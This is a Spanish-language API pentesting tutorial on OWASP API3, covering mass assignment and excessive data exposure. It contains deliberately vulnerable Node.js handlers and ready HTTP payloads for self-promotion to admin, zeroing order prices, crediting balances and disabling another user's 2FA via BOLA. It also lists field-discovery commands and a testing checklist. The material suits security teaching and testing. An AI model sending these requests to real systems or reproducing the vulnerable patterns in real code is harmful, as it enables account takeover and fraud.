# API3 — Broken Object Property Level Authorization

API3 agrupa dos problemas relacionados con los **propiedades de los objetos** que una API expone o acepta:

```
Mass Assignment:     la API acepta más campos de los que debería
                     → El usuario puede modificar propiedades que no le pertenecen

Excessive Data Exposure: la API devuelve más datos de los necesarios
                     → El cliente filtra los datos, pero la API los expone todos
```

### Mass Assignment

#### ¿Qué es?

Los frameworks modernos (Rails, Laravel, Spring, Django...) permiten actualizar un objeto pasando directamente un JSON con los campos. Si no hay una whitelist de campos permitidos, el atacante puede incluir campos que no debería poder modificar.

```javascript
// Código vulnerable (Node.js / Express)
app.put('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    await user.update(req.body);  // ← asigna TODOS los campos del body
    res.json(user);
});

// Petición normal del cliente:
PUT /api/users/1042
{"name": "Juan", "email": "juan@test.com"}

// Petición del atacante:
PUT /api/users/1042
{"name": "Juan", "email": "juan@test.com", "role": "admin", "balance": 999999}
→ Si el framework asigna todos los campos → escalada de privilegios
```

#### Encontrar campos ocultos

```bash
# Método 1: Leer la respuesta de GET y probar los campos en PUT/POST
# Si GET /api/users/me devuelve:
{
    "id": 1042,
    "name": "Juan",
    "email": "juan@test.com",
    "role": "user",           ← campo de rol visible en la respuesta
    "is_admin": false,        ← campo de admin visible
    "balance": 0,             ← campo de balance visible
    "verified": true
}
# → Probar todos esos campos en el PUT/POST

# Método 2: Arjun — descubrir parámetros ocultos
arjun -u https://target.com/api/users/1042 --method PUT
arjun -u https://target.com/api/register --method POST

# Método 3: Documentación Swagger / OpenAPI
# La documentación lista todos los campos del modelo
# Algunos campos están marcados como "readOnly" en la spec
# Pero el servidor puede no enforcearlo

# Método 4: Buscar en el código fuente si está disponible
grep -r "attr_accessible\|mass_assign\|fillable\|@JsonProperty" --include="*.rb" .
```

#### Campos a probar en mass assignment

```http
-- En registro de usuario --
POST /api/auth/register
{
    "username": "attacker",
    "password": "pass123",
    "email": "a@test.com",
    "role": "admin",
    "is_admin": true,
    "admin": 1,
    "superuser": true,
    "verified": true,
    "email_verified": true,
    "account_type": "premium",
    "credits": 9999,
    "balance": 999999,
    "permissions": ["read","write","admin","delete"],
    "group_id": 1,
    "plan": "enterprise"
}

-- En actualización de perfil --
PUT /api/users/1042
{
    "name": "Juan",
    "role": "admin",
    "is_staff": true,
    "is_superuser": true,
    "password": "hacked123",
    "two_factor_enabled": false,
    "locked": false
}

-- En pedidos / transacciones --
POST /api/orders
{
    "product_id": 5,
    "quantity": 1,
    "price": 0.01,          ← modificar precio
    "discount": 100,         ← añadir descuento
    "total": 0,              ← total a cero
    "status": "paid",        ← marcar como pagado directamente
    "payment_status": "completed"
}
```

#### Ejemplos de escalada via mass assignment

```http
-- Escalada a admin en registro --
POST /api/register HTTP/1.1
Content-Type: application/json

{"username":"hacker","password":"pass","email":"h@test.com","role":"admin"}
→ 201 Created {"id": 1099, "role": "admin"}  ← mass assignment explotado

-- Desactivar 2FA de otro usuario (si hay BOLA + mass assignment) --
PUT /api/users/1043/settings
{"two_factor_enabled": false, "two_factor_secret": null}
→ 200 OK → 2FA de la víctima desactivado

-- Creditar balance en app de pagos --
PUT /api/users/1042
{"balance": 999999, "credits": 9999}
→ 200 OK {"balance": 999999}  ← dinero gratis
```

### Excessive Data Exposure

#### ¿Qué es?

La API devuelve **más datos de los que el cliente necesita**, confiando en que el cliente solo mostrará los relevantes. Esto expone datos sensibles que nunca deberían salir del servidor.

```javascript
// Código vulnerable
app.get('/api/users/:id', async (req, res) => {
    const user = await User.findById(req.params.id);
    res.json(user);  // ← devuelve el objeto completo, incluyendo campos sensibles
});

// Respuesta de la API (todos los campos del modelo):
{
    "id": 1042,
    "name": "Juan García",
    "email": "juan@empresa.com",
    "phone": "+34 666 123 456",
    "address": "Calle Mayor 1, Madrid",
    "password_hash": "$2b$10$...",       ← hash de contraseña
    "ssn": "12345678A",                   ← DNI
    "credit_card": "4111111111111111",    ← tarjeta de crédito
    "api_key": "sk-prod-abc123",          ← API key
    "2fa_secret": "JBSWY3DPEHPK3PXP",    ← secreto 2FA
    "reset_token": "a1b2c3d4e5f6",        ← token de reset
    "role": "admin",
    "internal_notes": "Cliente VIP"
}
// El frontend muestra solo nombre y email, pero la API expone TODO
```

#### Dónde buscar excessive data exposure

```bash
# 1. Comparar lo que muestra la UI con lo que devuelve la API
# Abrir DevTools → Network → inspeccionar respuestas JSON
# ¿Hay más campos en el JSON que en la pantalla?

# 2. Endpoints de búsqueda / listado
# Suelen devolver objetos completos aunque el cliente solo use 2 campos
GET /api/users?search=juan
GET /api/products/search?q=laptop
GET /api/employees

# 3. Endpoints de terceros / integraciones
GET /api/v1/payments/history     → ¿Devuelve PAN de tarjeta?
GET /api/v1/users/profile        → ¿Devuelve hash de contraseña?
GET /api/v1/orders               → ¿Devuelve datos de pago?

# 4. Comparar respuesta de GET vs campos en formulario de edición
# Si el formulario solo permite editar "nombre" y "bio"
# pero el GET devuelve 20 campos → exceso de exposición
```

#### Campos sensibles comunes en respuestas de API

```json
// Autenticación / credenciales
"password_hash": "...",
"password_reset_token": "...",
"api_key": "sk-...",
"secret_key": "...",
"2fa_secret": "JBSWY3D...",
"remember_token": "...",

// Datos personales (PII)
"ssn": "...",          // Número de seguridad social / DNI
"date_of_birth": "...",
"credit_card": "4111...",
"card_last4": "1234",
"bank_account": "ES76...",

// Datos internos
"internal_id": "...",
"stripe_customer_id": "cus_...",
"aws_access_key": "AKIA...",
"database_id": "...",
"internal_notes": "...",
"admin_comment": "...",

// Tokens
"session_token": "...",
"refresh_token": "...",
"oauth_token": "...",
"webhook_secret": "..."
```

### Combinar Mass Assignment + BOLA

```http
-- BOLA para leer datos del usuario objetivo --
GET /api/users/1043
→ {"id": 1043, "email": "victim@empresa.com", "role": "user", "api_key": "sk-..."}

-- Mass assignment para modificar sus propiedades --
PUT /api/users/1043
{"role": "admin", "password": "hacked123", "two_factor_enabled": false}
→ 200 OK → cuenta de la víctima comprometida con privilegios de admin
```

### Checklist API3

```
Mass Assignment:
□ En el endpoint de registro, añadir campos: role, is_admin, admin, verified
□ En actualización de perfil, añadir: role, is_staff, is_superuser, balance
□ En creación de pedido, modificar: price, discount, total, status
□ Usar Arjun para descubrir campos ocultos en endpoints PUT/POST
□ Revisar la documentación OpenAPI para campos marcados como readOnly
□ Comparar campos de la respuesta GET con los campos aceptados en PUT/POST

Excessive Data Exposure:
□ Revisar TODAS las respuestas JSON en DevTools/Burp
□ Comparar lo que muestra la UI con lo que devuelve la API
□ Buscar: password_hash, api_key, token, secret, ssn, credit_card en respuestas
□ Probar endpoints de listado/búsqueda (suelen devolver más datos)
□ Verificar endpoints de exportación (CSV, JSON export)
□ Probar acceder a objetos de otros usuarios (BOLA) y ver qué campos extra aparecen
```

> Mass assignment es trivial de explotar si la API devuelve los campos sensibles en un GET: esos mismos campos se pueden enviar en el PUT. Ver la respuesta del GET y probarlo todo en el PUT es el workflow básico.

> Excessive data exposure es una de las vulnerabilidades más frecuentes en APIs reales porque es fácil de introducir: el developer añade un campo al modelo y automáticamente se serializa en todas las respuestas sin revisarlo.

> Un campo `password_hash` en una respuesta de API es un hallazgo Critical por sí solo — aunque esté hasheado, exponerlo permite ataques offline. Lo mismo aplica a secretos 2FA, tokens de reset y API keys.
